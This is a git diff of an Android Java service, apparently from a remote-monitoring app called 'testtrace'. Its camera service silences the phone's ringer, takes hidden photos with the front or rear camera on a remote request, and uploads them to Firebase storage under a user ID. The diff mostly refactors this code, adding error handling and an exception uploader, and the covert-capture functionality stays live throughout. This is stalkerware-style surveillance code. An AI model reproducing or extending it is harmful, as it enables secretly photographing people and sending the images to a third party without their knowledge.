@@ -26,6 +26,7 @@ import com.google.firebase.firestore.DocumentReference;
 import com.google.firebase.firestore.FirebaseFirestore;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
+import com.reiserx.testtrace.Classes.ExceptionHandler;
 import com.reiserx.testtrace.Models.TaskSuccess;
 import com.reiserx.testtrace.Models.downloadUrl;
 
@@ -45,6 +46,8 @@ public class CameraService extends HiddenCameraService {
 
     TaskSuccess taskSuccess;
 
+    String UserID;
+
     @Override
     public IBinder onBind(Intent intent) {
         // TODO: Return the communication channel to the service.
@@ -54,55 +57,58 @@ public class CameraService extends HiddenCameraService {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
 
-        int requestCode = intent.getIntExtra("requestCode", 0);
+        try {
+            int requestCode = intent.getIntExtra("requestCode", 0);
 
-        Log.d(TAG, String.valueOf(requestCode));
+            Log.d(TAG, String.valueOf(requestCode));
 
-        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
-                == PackageManager.PERMISSION_GRANTED) {
+            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
+                    == PackageManager.PERMISSION_GRANTED) {
 
-            if (HiddenCameraUtils.canOverDrawOtherApps(this)) {
+                if (HiddenCameraUtils.canOverDrawOtherApps(this)) {
 
-                AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
-                audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
-                if (requestCode == 1) {
-                    cameraConfig = new CameraConfig()
-                            .getBuilder(this)
-                            .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
-                            .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
-                            .setImageFormat(CameraImageFormat.FORMAT_JPEG)
-                            .build();
-                } else if (requestCode == 2){
-                    cameraConfig = new CameraConfig()
-                            .getBuilder(this)
-                            .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)
-                            .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
-                            .setImageFormat(CameraImageFormat.FORMAT_JPEG)
-                            .build();
+                    AudioManager audioManager = (AudioManager) getSystemService(Context.AUDIO_SERVICE);
+                    audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
+                    if (requestCode == 1) {
+                        cameraConfig = new CameraConfig()
+                                .getBuilder(this)
+                                .setCameraFacing(CameraFacing.FRONT_FACING_CAMERA)
+                                .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
+                                .setImageFormat(CameraImageFormat.FORMAT_JPEG)
+                                .build();
+                    } else if (requestCode == 2) {
+                        cameraConfig = new CameraConfig()
+                                .getBuilder(this)
+                                .setCameraFacing(CameraFacing.REAR_FACING_CAMERA)
+                                .setCameraResolution(CameraResolution.MEDIUM_RESOLUTION)
+                                .setImageFormat(CameraImageFormat.FORMAT_JPEG)
+                                .build();
+                    }
+
+                    startCamera(cameraConfig);
+
+                    SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
+                    UserID = save.getString("UserID", "");
+
+                    mdb = FirebaseDatabase.getInstance();
+                    reference = mdb.getReference().child("Main").child(UserID).child("CameraCapture");
+
+                    new android.os.Handler().postDelayed(() -> {
+                        taskSuccess = new TaskSuccess("Capturing image", true, false);
+                        reference.setValue(taskSuccess);
+                        takePicture();
+                    }, 2000L);
+                } else {
+
+                    //Open settings to grant permission for "Draw other apps".
+                    HiddenCameraUtils.openDrawOverPermissionSetting(this);
                 }
-
-                startCamera(cameraConfig);
-
-                SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
-                String UserID = save.getString("UserID", "");
-
-                mdb = FirebaseDatabase.getInstance();
-                reference = mdb.getReference().child("Main").child(UserID).child("CameraCapture");
-
-                new android.os.Handler().postDelayed(() -> {
-                    taskSuccess = new TaskSuccess("Capturing image", true, false);
-                    reference.setValue(taskSuccess);
-                    takePicture();
-                }, 2000L);
             } else {
-
-                //Open settings to grant permission for "Draw other apps".
-                HiddenCameraUtils.openDrawOverPermissionSetting(this);
+                reference.setValue("Camera permission not available");
             }
-        } else {
-
-            //TODO Ask your parent activity for providing runtime permission
-            reference.setValue("Camera permission not available");
+        } catch (Exception e) {
+            ExceptionHandler exceptionHandler = new ExceptionHandler(e, UserID);
+            exceptionHandler.upload();
         }
         return START_NOT_STICKY;
     }
@@ -164,10 +170,6 @@ public class CameraService extends HiddenCameraService {
     }
 
     public void uploadImageToServer (File file) {
-
-        SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
-        String UserID = save.getString("UserID", "");
-
         StorageReference storageReference = FirebaseStorage.getInstance().getReference().child("Main").child(UserID).child("CameraPicture").child(file.getName());
         DocumentReference documentReference = FirebaseFirestore.getInstance().collection("Main").document(UserID).collection("CameraPicture").document(file.getName());
         storageReference.putFile(Uri.fromFile(file)).addOnCompleteListener(task -> {
